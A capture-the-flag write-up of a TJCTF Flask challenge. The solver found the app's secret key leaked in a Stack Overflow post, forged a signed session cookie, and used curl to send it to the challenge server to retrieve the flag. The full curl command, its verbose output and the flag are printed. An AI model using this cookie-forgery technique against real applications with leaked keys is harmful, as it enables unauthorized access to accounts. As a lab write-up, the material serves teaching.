### Solved by Swappage

In this problem we were provided with the following python flask web application

```python
from flask import Flask, render_template, session, request
app = Flask(__name__)
app.secret_key = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

@app.route('/',methods=['GET','POST'])
def index():
    if request.method == 'POST':
        a = int(request.form['a'])
        b = int(request.form['b'])
        # Updated 11/19/2014 by Steve Katz - Couldn't figure out why this was returning the wrong result, so asked online
        result = a*1.0/b
        return render_template('index.html',session=session,result=result)
    if 'loggedin' in session and session['loggedin']:
        flag = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
        return render_template('index.html',session=session,flag=flag)
    return render_template('index.html',session=session)

@app.route('/login',methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin' and password == 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX':
            session['loggedin'] = True
            return render_template('login.html',session=session,loggedin=True)
        return render_template('login.html',session=session,loggedin=False)
    return render_template('login.html',session=session)

if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

And we needed to successfully login.
The division error wasn't the real problem, the application doesn't have a flaw itself, yet if we look at the comment at line 10
we can see that the author asked online for help on the problem

By searching on google we could find the question about the division error problem on stack overflow, and the author of the question, while posting the code snipplet
forgot to remove the application secret key used to sign the session cookies.

By using that secret key and replacing it in the source code, we could run the server locally, forge a correctly signed session cookie and send it to the real application to retrieve the flag

    $ curl -b 'session=eyJsb2dnZWRpbiI6dHJ1ZX0.CB7KBQ.aS33adDXgYjBWYdGAg2MuqjjV1A; Path=/; HttpOnly' http://division-error.p.tjctf.org -v

    * About to connect() to division-error.p.tjctf.org port 80 (#0)
    *   Trying 137.117.56.127...
    * connected
    * Connected to division-error.p.tjctf.org (137.117.56.127) port 80 (#0)
    > GET / HTTP/1.1
    > User-Agent: curl/7.26.0
    > Host: division-error.p.tjctf.org
    > Accept: */*
    > Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZX0.CB7KBQ.aS33adDXgYjBWYdGAg2MuqjjV1A; Path=/; HttpOnly
    >
    * additional stuff not fine transfer.c:1037: 0 0
    * HTTP 1.1 or later with persistent connection, pipelining supported
    < HTTP/1.1 200 OK
    < Server: nginx/1.6.2 (Ubuntu)
    < Date: Wed, 29 Apr 2015 11:31:30 GMT
    < Content-Type: text/html; charset=utf-8
    < Content-Length: 2327
    < Connection: keep-alive
    < Set-Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZX0.CCJSkg.rya2_MVigs5eluOD5hLhOyAbwdU; HttpOnly; Path=/
    <
    <!DOCTYPE html>
    <html>
    <head>
    ...
    <p>Wow, you did it! The flag is woah_that_was_some_nice_session_magic.</p>

the flag is

    woah_that_was_some_nice_session_magic

